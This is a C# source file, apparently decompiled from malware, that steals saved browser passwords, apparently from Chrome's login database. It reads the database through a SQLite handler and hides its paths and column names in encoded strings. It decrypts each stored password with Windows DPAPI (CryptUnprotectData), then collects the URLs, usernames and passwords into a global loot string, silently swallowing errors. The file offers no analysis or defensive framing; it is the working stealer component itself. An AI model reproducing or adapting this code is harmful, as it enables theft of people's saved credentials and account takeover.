using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

public class DAChrome
{
	[Flags]
	public enum CryptProtectPromptFlags
	{
		CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
		CRYPTPROTECT_PROMPT_ON_PROTECT = 2
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct CRYPTPROTECT_PROMPTSTRUCT
	{
		public int cbSize;

		public CryptProtectPromptFlags dwPromptFlags;

		public IntPtr hwndApp;

		public string szPrompt;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct DATA_BLOB
	{
		public int cbData;

		public IntPtr pbData;
	}

	public static string cPass;

	public static void GTCHRME()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + LOOTCKC.IPNPIWT("jZPGzbedsbOhuKO7xMOshr+80HB1rcu/rHWxvb/FncCzqr+YtcV+lJLAuBg=", "False");
		checked
		{
			try
			{
				new SQLiteHandler(text);
				SQLiteHandler.REDTBLE(LOOTCKC.IPNPIWT("l7W4wbieHA==", "False"));
				if (!File.Exists(text))
				{
					return;
				}
				int num = SQLiteHandler.GetRowCount() - 1;
				for (int i = 0; i <= num; i++)
				{
					string value = SQLiteHandler.GetValue(i, LOOTCKC.IPNPIWT("jautsqaMmLm9qSg=", "False"));
					string value2 = SQLiteHandler.GetValue(i, LOOTCKC.IPNPIWT("nre0yLaKsbS1voqwxLsh", "False"));
					string text2 = Decrypt(Encoding.Default.GetBytes(SQLiteHandler.GetValue(i, LOOTCKC.IPNPIWT("oa3K0cegvru9xpK4zMMZ", "False"))));
					if ((Operators.CompareString(value2, "", false) != 0) & (Operators.CompareString(text2, "", false) != 0))
					{
						cPass = LOOTCKC.IPNPIWT("gZynrqCBnKeuoIGcrdnVs8zPrqCBnKeuoIGcp66ggZwE", "False") + "\r\n" + LOOTCKC.IPNPIWT("fL7N1Y1UEw==", "False") + value + "\r\n" + LOOTCKC.IPNPIWT("eLGuwrCEq66KYiM=", "False") + value2 + "\r\n" + LOOTCKC.IPNPIWT("eqbDysCZt7SRaRw=", "False") + text2 + "\r\n" + LOOTCKC.IPNPIWT("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZQg", "False") + "\r\n ";
						KVPXNIVH.RVDKU += cPass;
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, string szDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

	public static string Decrypt(byte[] Datas)
	{
		DATA_BLOB pDataIn = default(DATA_BLOB);
		DATA_BLOB pDataOut = default(DATA_BLOB);
		GCHandle gCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
		pDataIn.pbData = gCHandle.AddrOfPinnedObject();
		pDataIn.cbData = Datas.Length;
		gCHandle.Free();
		DATA_BLOB dATA_BLOB = default(DATA_BLOB);
		DATA_BLOB pOptionalEntropy = dATA_BLOB;
		CRYPTPROTECT_PROMPTSTRUCT cRYPTPROTECT_PROMPTSTRUCT = default(CRYPTPROTECT_PROMPTSTRUCT);
		CRYPTPROTECT_PROMPTSTRUCT pPromptStruct = cRYPTPROTECT_PROMPTSTRUCT;
		IntPtr pvReserved = default(IntPtr);
		CryptUnprotectData(ref pDataIn, null, ref pOptionalEntropy, pvReserved, ref pPromptStruct, 0, ref pDataOut);
		checked
		{
			byte[] array = new byte[pDataOut.cbData + 1];
			Marshal.Copy(pDataOut.pbData, array, 0, pDataOut.cbData);
			string @string = Encoding.Default.GetString(array);
			return @string.Substring(0, @string.Length - 1);
		}
	}
}
